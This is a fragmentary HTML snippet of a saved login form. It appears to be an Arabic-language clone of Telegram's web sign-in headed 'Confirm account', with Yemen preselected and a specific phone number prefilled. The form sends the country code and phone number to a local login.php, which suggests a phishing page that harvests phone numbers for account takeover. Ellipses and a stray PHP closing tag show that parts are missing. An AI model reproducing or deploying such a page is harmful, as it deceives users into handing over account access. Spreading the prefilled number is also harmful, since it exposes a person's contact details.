...
<meta name="savepage-comments" content="">
  ...
  <form action="./login.php" method="post" name="mySendCodeForm" ng-if="!credentials.phone_code_hash" ng-submit="sendCode()" class="ng-pristine ng-invalid ng-invalid-required">
        <h3 class="login_form_head" my-i18n="login_sign_in">تأكيد الحساب</h3>
        ...
        <div class="md-input-group md-input-has-value login_phone_country_input_group" ng-click="chooseCountry()">
          <label class="md-input-label" my-i18n="login_country_select_placeholder">الدولة</label>
          <div autocomplete="off" class="md-input" ng-bind="credentials.phone_country_name" id="country">اليمن</div>
        </div>
        ...
        <div class="login_phone_groups_wrap clearfix">
          ...
          <div class="md-input-group login_phone_code_input_group md-input-has-value md-input-animated" ng-class="{'md-input-error': error.field == 'phone'}" my-labeled-input="">
            <label class="md-input-label" my-i18n="login_code_input_placeholder">رقم الهاتف</label>
            <input autocomplete="off" class="md-input ng-pristine ng-valid ng-not-empty ng-touched" my-focused="" name="phone_country" type="tel" ng-model="credentials.phone_country" style="" value="+967" id="tel">
          </div>
...
?>
          ...
          <div class="md-input-group login_phone_num_input_group md-input-animated" ng-class="{'md-input-error': error.field == 'phone'}" my-labeled-input="" ng-switch="error.field == 'phone'">
            ...
            <input required="" autocomplete="off" my-submit-on-enter="" class="md-input ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" my-focus-on="country_selected" name="phone_number" type="tel" ng-model="credentials.phone_number" style="" value="771139923">
          </div>
